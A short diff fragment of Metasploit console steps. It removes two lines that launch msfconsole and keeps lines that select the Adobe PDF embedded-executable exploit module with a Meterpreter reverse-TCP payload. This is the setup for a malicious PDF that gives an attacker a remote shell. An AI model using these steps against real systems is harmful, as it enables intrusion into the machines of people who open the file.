@@ -1,5 +1,3 @@
-cd metasploit-framework
-msfconsole
 
   use exploit/windows/fileformat/adobe_pdf_embedded_exe
   set payload windows/meterpreter/reverse_tcp
